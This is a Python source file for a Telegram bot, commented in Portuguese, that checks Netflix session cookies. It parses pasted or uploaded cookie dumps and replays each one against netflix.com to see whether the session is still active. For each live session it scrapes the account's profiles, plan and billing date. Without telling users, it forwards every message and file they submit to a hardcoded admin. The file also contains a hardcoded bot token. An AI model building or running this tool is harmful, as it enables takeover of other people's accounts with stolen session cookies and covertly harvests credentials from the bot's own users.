import logging
import json
import requests
import os
import re
import html
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters

# --- CONFIGURAÇÕES ---
ADMIN_ID = 1590653771  # Seu ID de administrador
USERS_FILE = "usuarios.json"  # Arquivo para salvar os IDs dos usuários

# ⚠️ SUBSTITUA PELO LINK DIRETO DA SUA IMAGEM (URL .jpg, .png, etc)
START_IMAGE_URL = "https://i.postimg.cc/cCH2sTh2/Picsart-26-06-25-19-16-11-663.jpg"

# Configuração de logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.CRITICAL
)
logger = logging.getLogger(__name__)

# Silencia logs de bibliotecas externas
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# URLs da Netflix
NETFLIX_BROWSE_URL = "https://www.netflix.com/browse"
NETFLIX_ACCOUNT_URL = "https://www.netflix.com/YourAccount"


def save_user(user_id):
    """Salva o ID do usuário se ele ainda não estiver na lista."""
    try:
        users = []
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                users = json.load(f)

        if user_id not in users:
            users.append(user_id)
            with open(USERS_FILE, "w") as f:
                json.dump(users, f)
    except:
        pass


def get_all_users():
    """Retorna a lista de todos os usuários cadastrados."""
    if not os.path.exists(USERS_FILE):
        return []
    try:
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    except:
        return []


# ==========================================
# FUNÇÃO START COM FOTO
# ==========================================
async def start(update: Update, context) -> None:
    """Mensagem de boas-vindas com foto personalizada."""
    save_user(update.effective_user.id)

    caption = (
        "🍪 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗡𝗲𝘁𝗳𝗹𝗶𝘅 𝗖𝗼𝗼𝗸𝗶𝗲𝘀\n\n"
        "📨 Envie Cookies em 𝗧𝗲𝘅𝘁𝗼 ou 𝗔𝗿𝗾𝘂𝗶𝘃𝗼 .𝘁𝘅𝘁\n"
        "❓ Suporte: @tearsofmoney7\n\n"
        ""
    )

    try:
        # Tenta enviar a foto com a legenda
        await update.message.reply_photo(
            photo=START_IMAGE_URL,
            caption=caption,
            parse_mode='HTML'
        )
    except Exception as e:
        # Se a imagem falhar, envia apenas o texto
        logger.warning(f"Falha ao carregar imagem do /start: {e}")
        await update.message.reply_text(
            caption.replace("<b>", "").replace("</b>", ""),
            parse_mode=None
        )


# ==========================================
# FUNÇÕES DE BROADCAST
# ==========================================
async def broadcast_handler(update: Update, context) -> None:
    """
    Manipulador principal do comando /all.
    Detecta automaticamente se é texto puro, resposta a foto,
    documento ou vídeo.
    """
    user_id = update.effective_user.id

    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Você não tem permissão para usar este comando.")
        return

    # Verifica se é resposta a uma mensagem com mídia
    if update.message.reply_to_message:
        if update.message.reply_to_message.photo:
            await broadcast_photo(update, context)
            return
        elif update.message.reply_to_message.document:
            await broadcast_document(update, context)
            return
        elif update.message.reply_to_message.video:
            await broadcast_video(update, context)
            return
        elif update.message.reply_to_message.audio:
            await broadcast_audio(update, context)
            return

    # Se não for resposta a mídia, é broadcast de texto
    if not context.args:
        await update.message.reply_text(
            "📢 <b>Comando /all</b>\n\n"
            "• <b>Texto:</b> <code>/all Sua mensagem</code>\n"
            "• <b>Foto:</b> Responda a uma foto com <code>/all</code>\n"
            "• <b>Arquivo:</b> Responda a um arquivo com <code>/all</code>\n"
            "• <b>Vídeo:</b> Responda a um vídeo com <code>/all</code>\n"
            "• <b>Áudio:</b> Responda a um áudio com <code>/all</code>",
            parse_mode='HTML'
        )
        return

    message_to_send = " ".join(context.args)
    await broadcast_text(update, context, message_to_send)


async def broadcast_text(update: Update, context, message: str):
    """Envia mensagem de texto para todos os usuários."""
    users = get_all_users()

    if not users:
        await update.message.reply_text("❌ Nenhum usuário cadastrado ainda.")
        return

    status_msg = await update.message.reply_text(
        f"📡 Enviando texto para <b>{len(users)}</b> usuários...",
        parse_mode='HTML'
    )

    count_success = 0
    count_fail = 0

    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=message)
            count_success += 1
        except Exception as e:
            count_fail += 1
            logger.warning(f"Falha ao enviar texto para {uid}: {e}")

    await status_msg.edit_text(
        f"✅ <b>Transmissão de texto concluída!</b>\n\n"
        f"📊 Sucesso: {count_success}\n"
        f"❌ Falha: {count_fail}",
        parse_mode='HTML'
    )


async def broadcast_photo(update: Update, context) -> None:
    """Envia foto com legenda opcional para todos os usuários."""
    users = get_all_users()

    if not users:
        await update.message.reply_text("❌ Nenhum usuário cadastrado ainda.")
        return

    photo = update.message.reply_to_message.photo[-1]
    caption = " ".join(context.args) if context.args else (
        update.message.reply_to_message.caption or ""
    )

    status_msg = await update.message.reply_text(
        f"🖼️ Enviando foto para <b>{len(users)}</b> usuários...",
        parse_mode='HTML'
    )

    count_success = 0
    count_fail = 0

    for uid in users:
        try:
            await context.bot.send_photo(
                chat_id=uid,
                photo=photo.file_id,
                caption=caption
            )
            count_success += 1
        except Exception as e:
            count_fail += 1
            logger.warning(f"Falha ao enviar foto para {uid}: {e}")

    await status_msg.edit_text(
        f"✅ <b>Envio de foto concluído!</b>\n\n"
        f"📊 Sucesso: {count_success}\n"
        f"❌ Falha: {count_fail}",
        parse_mode='HTML'
    )


async def broadcast_document(update: Update, context) -> None:
    """Envia documento/arquivo com legenda opcional para todos os usuários."""
    users = get_all_users()

    if not users:
        await update.message.reply_text("❌ Nenhum usuário cadastrado ainda.")
        return

    doc = update.message.reply_to_message.document
    caption = " ".join(context.args) if context.args else (
        update.message.reply_to_message.caption or ""
    )

    status_msg = await update.message.reply_text(
        f"📁 Enviando arquivo para <b>{len(users)}</b> usuários...",
        parse_mode='HTML'
    )

    count_success = 0
    count_fail = 0

    for uid in users:
        try:
            await context.bot.send_document(
                chat_id=uid,
                document=doc.file_id,
                caption=caption,
                filename=doc.file_name
            )
            count_success += 1
        except Exception as e:
            count_fail += 1
            logger.warning(f"Falha ao enviar arquivo para {uid}: {e}")

    await status_msg.edit_text(
        f"✅ <b>Envio de arquivo concluído!</b>\n\n"
        f"📊 Sucesso: {count_success}\n"
        f"❌ Falha: {count_fail}",
        parse_mode='HTML'
    )


async def broadcast_video(update: Update, context) -> None:
    """Envia vídeo com legenda opcional para todos os usuários."""
    users = get_all_users()

    if not users:
        await update.message.reply_text("❌ Nenhum usuário cadastrado ainda.")
        return

    video = update.message.reply_to_message.video
    caption = " ".join(context.args) if context.args else (
        update.message.reply_to_message.caption or ""
    )

    status_msg = await update.message.reply_text(
        f"🎬 Enviando vídeo para <b>{len(users)}</b> usuários...",
        parse_mode='HTML'
    )

    count_success = 0
    count_fail = 0

    for uid in users:
        try:
            await context.bot.send_video(
                chat_id=uid,
                video=video.file_id,
                caption=caption
            )
            count_success += 1
        except Exception as e:
            count_fail += 1
            logger.warning(f"Falha ao enviar vídeo para {uid}: {e}")

    await status_msg.edit_text(
        f"✅ <b>Envio de vídeo concluído!</b>\n\n"
        f"📊 Sucesso: {count_success}\n"
        f"❌ Falha: {count_fail}",
        parse_mode='HTML'
    )


async def broadcast_audio(update: Update, context) -> None:
    """Envia áudio com legenda opcional para todos os usuários."""
    users = get_all_users()

    if not users:
        await update.message.reply_text("❌ Nenhum usuário cadastrado ainda.")
        return

    audio = update.message.reply_to_message.audio
    caption = " ".join(context.args) if context.args else (
        update.message.reply_to_message.caption or ""
    )

    status_msg = await update.message.reply_text(
        f"🎵 Enviando áudio para <b>{len(users)}</b> usuários...",
        parse_mode='HTML'
    )

    count_success = 0
    count_fail = 0

    for uid in users:
        try:
            await context.bot.send_audio(
                chat_id=uid,
                audio=audio.file_id,
                caption=caption
            )
            count_success += 1
        except Exception as e:
            count_fail += 1
            logger.warning(f"Falha ao enviar áudio para {uid}: {e}")

    await status_msg.edit_text(
        f"✅ <b>Envio de áudio concluído!</b>\n\n"
        f"📊 Sucesso: {count_success}\n"
        f"❌ Falha: {count_fail}",
        parse_mode='HTML'
    )


# ==========================================
# FUNÇÕES DO CHECKER NETFLIX
# ==========================================
def parse_netscape_cookies(text):
    """
    Parse cookies no formato Netscape/Mozilla:
    .netflix.com TRUE / FALSE 1802645711 OptanonAlertBoxClosed 2026-02-14T22:55:11.652Z
    """
    cookies_dict = {}

    netscape_pattern = re.compile(
        r'([^\s]+)\s+(TRUE|FALSE)\s+([^\s]+)\s+(TRUE|FALSE)\s+(\d+)\s+([^\s]+)\s+(.+)',
        re.MULTILINE
    )

    matches = netscape_pattern.findall(text)
    for match in matches:
        domain, http_only, path, secure, expiration, name, value = match
        if name.startswith('#') or domain.startswith('#'):
            continue

        clean_name = name.strip()
        clean_value = value.strip()

        if clean_name and clean_value:
            cookies_dict[clean_name] = clean_value

    return cookies_dict


def extract_all_cookies(text):
    """
    Extrai múltiplos conjuntos de cookies de um texto misto.
    Suporta formatos: JSON (array/objeto), Netscape/Mozilla, e key=value simples
    """
    found_cookies = []

    # MÉTODO 1: Detectar blocos JSON
    json_blocks = re.findall(r'(\[[\s\S]*?\]|\{[\s\S]*?\})', text)
    for block in json_blocks:
        try:
            data = json.loads(block)
            cookies_dict = {}
            if isinstance(data, list):
                for c in data:
                    name = c.get('name') or c.get('Name')
                    value = c.get('value') or c.get('Value')
                    if name and value:
                        cookies_dict[name] = value
            elif isinstance(data, dict):
                cookies_dict = data
            if cookies_dict and 'NetflixId' in cookies_dict:
                found_cookies.append(cookies_dict)
        except:
            continue

    # Remove blocos JSON já processados do texto
    remaining_text = text
    for block in json_blocks:
        remaining_text = remaining_text.replace(block, "")

    # MÉTODO 2: Detectar formato Netscape/Mozilla
    netscape_indicator = re.search(
        r'(?:\.netflix\.com|#\s*HTTP\s*Cookie\s*File)',
        remaining_text,
        re.IGNORECASE
    )

    if netscape_indicator or re.search(r'TRUE\s+/\s+(?:TRUE|FALSE)\s+\d+\s+\w+', remaining_text):
        sections = re.split(r'\n(?=\.netflix\.com\s)', remaining_text)

        if len(sections) == 1:
            sections = re.split(r'\n\s*\n|--+\s*\n|={3,}\s*\n', remaining_text)

        for section in sections:
            if not section.strip():
                continue
            cookies_dict = parse_netscape_cookies(section)
            if cookies_dict and 'NetflixId' in cookies_dict:
                found_cookies.append(cookies_dict)

    # MÉTODO 3: Detectar formato key=value simples
    if not found_cookies:
        text_blocks = re.split(r',\s*\n|\n\n|\r\n\r\n', remaining_text)
        for block in text_blocks:
            if not block.strip():
                continue
            cookies_dict = {}
            pairs = re.findall(r'([^=\s;]+)=([^;\s,]+)', block)
            for key, value in pairs:
                try:
                    clean_key = key.strip().encode('ascii', 'ignore').decode('ascii')
                    clean_val = value.strip().encode('ascii', 'ignore').decode('ascii')
                    cookies_dict[clean_key] = clean_val
                except:
                    continue
            if cookies_dict and 'NetflixId' in cookies_dict:
                found_cookies.append(cookies_dict)

    return found_cookies


def decode_netflix_value(value):
    """Decodifica valores da Netflix que podem conter escapes unicode ou HTML."""
    if value is None:
        return None
    try:
        cleaned = html.unescape(str(value))
        cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
        cleaned = cleaned.encode().decode('unicode-escape', errors='ignore')
        cleaned = re.sub(r"\s+", " ", cleaned).strip()
        return cleaned
    except:
        return str(value)


def extract_first_match(text, patterns):
    """Tenta encontrar o primeiro match em uma lista de padrões regex."""
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return decode_netflix_value(match.group(1))
    return None


def get_netflix_info(cookies):
    """Acessa a Netflix e tenta extrair perfis, plano e próxima cobrança."""
    info = {
        "status": "Invalido",
        "profiles": [],
        "plan": "Desconhecido",
        "next_billing": "Não encontrada"
    }
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": "https://www.netflix.com/"
        }

        session = requests.Session()
        session.headers.update(headers)

        # 1. Verificar se os cookies estão ativos
        res = session.get(NETFLIX_BROWSE_URL, cookies=cookies, allow_redirects=False, timeout=20)

        if res.status_code == 200:
            info["status"] = "Ativo"

            # Extração de perfis
            profiles_matches = re.findall(r'"name":"([^"]+)","avatarName"', res.text)
            if not profiles_matches:
                profiles_matches = re.findall(r'"profileName":"([^"]+)"', res.text)

            if profiles_matches:
                clean_profiles = []
                blacklist = [
                    'Kids', 'Crianças', 'chrome', 'windows', 'api',
                    'akiraBuildIdentifier', 'buildIdentifier', 'true', 'false', 'null'
                ]
                for p in profiles_matches:
                    p_final = decode_netflix_value(p)
                    if (p_final and
                        p_final.lower() not in [b.lower() for b in blacklist] and
                        p_final not in clean_profiles and
                        len(p_final) < 30):
                        clean_profiles.append(p_final)
                info["profiles"] = clean_profiles

            # 2. Acessar a página da conta para Plano e Cobrança
            acc_res = session.get(NETFLIX_ACCOUNT_URL, cookies=cookies, timeout=20)
            if acc_res.status_code == 200:
                # Padrões para Plano
                plan_patterns = [
                    r'"localizedPlanName"\s*:\s*"([^"]+)"',
                    r'"planName"\s*:\s*"([^"]+)"',
                    r'data-uia="plan-label">([^<]+)<',
                    r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                    r'<b>(Plano [^<]+)</b>'
                ]
                plan = extract_first_match(acc_res.text, plan_patterns)
                if plan:
                    info["plan"] = plan

                # Padrões para Próxima Cobrança
                billing_patterns = [
                    r'"nextBillingDate"\s*:\s*"([^"]+)"',
                    r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                    r'data-uia="nextBillingDate-item">([^<]+)<',
                    r'(?:Sua próxima fatura será em|Your next billing date is)\s*<b>([^<]+)</b>',
                    r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'
                ]
                billing = extract_first_match(acc_res.text, billing_patterns)
                if billing:
                    if re.match(r'\d{4}-\d{2}-\d{2}', billing):
                        parts = billing.split('-')
                        billing = f"{parts[2]}/{parts[1]}/{parts[0]}"
                    info["next_billing"] = billing

        elif res.status_code in [301, 302] and '/login' in res.headers.get('Location', ''):
            info["status"] = "Expirado"

    except Exception as e:
        info["status"] = "Erro"
        logger.warning(f"Erro ao verificar Netflix: {e}")

    return info


def get_user_info_str(update: Update):
    """Gera uma string com as informações do usuário."""
    user = update.effective_user
    info = f"👤 Usuário: {user.first_name}"
    if user.last_name:
        info += f" {user.last_name}"
    if user.username:
        info += f" (@{user.username})"
    info += f" [ID: {user.id}]"
    return info


async def process_and_reply(update: Update, context, content: str):
    """Processa o conteúdo e envia as respostas no chat."""
    all_cookies = extract_all_cookies(content)

    if not all_cookies:
        await update.message.reply_text("❌ Nenhum Cookie válido encontrado.")
        return

    await update.message.reply_text(f"🔍 Verificando <b>{len(all_cookies)}</b> Cookie(s)...", parse_mode='HTML')

    for i, cookies in enumerate(all_cookies):
        info = get_netflix_info(cookies)
        msg = f"<b>🍿 Resultado #{i+1}:</b>\n"
        msg += f"Status: {'✅' if info['status'] == 'Ativo' else '❌'} <b>{info['status']}</b>\n"
        if info['status'] == 'Ativo':
            msg += f"<b>Plano:</b> {info['plan']}\n"
            msg += f"<b>Próxima Cobrança:</b> {info['next_billing']}\n"
            msg += f"<b>Perfis ({len(info['profiles'])}):</b> {', '.join(info['profiles']) if info['profiles'] else 'Não detectados'}"
        await update.message.reply_text(msg, parse_mode='HTML')


async def handle_message(update: Update, context) -> None:
    """Processa mensagens de texto recebidas."""
    save_user(update.effective_user.id)
    user_text = update.message.text
    user_info = get_user_info_str(update)

    # Notifica o admin
    if ADMIN_ID:
        admin_msg = (
            f"📩 <b>Nova mensagem recebida</b>\n"
            f"{user_info}\n\n"
            f"<b>📝 Conteúdo:</b>\n{user_text}"
        )
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='HTML')
        except:
            pass

    await process_and_reply(update, context, user_text)


async def handle_document(update: Update, context) -> None:
    """Processa arquivos recebidos."""
    save_user(update.effective_user.id)
    doc = update.message.document
    file = await doc.get_file()
    file_name = doc.file_name
    file_path = f"temp_{file_name}"
    await file.download_to_drive(file_path)

    user_info = get_user_info_str(update)

    # Notifica o admin
    if ADMIN_ID:
        try:
            admin_header = (
                f"📎 <b>Arquivo recebido</b>\n"
                f"{user_info}\n"
                f"<b>📄 Nome:</b> <code>{file_name}</code>"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_header, parse_mode='HTML')
            await context.bot.send_document(chat_id=ADMIN_ID, document=doc.file_id)
        except:
            pass

    # Processa o arquivo
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        await process_and_reply(update, context, content)
    except Exception as e:
        await update.message.reply_text(f"❌ Erro ao ler o arquivo: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)


def main():
    """Função principal que inicia o bot."""
    token = "8770780999:AAESX1POdCwamnlPqg59a5e_kj9KdHCmv6M"
    app = Application.builder().token(token).build()

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("all", broadcast_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("✅ Bot iniciado com sucesso!")
    app.run_polling()


if __name__ == "__main__":
    main()
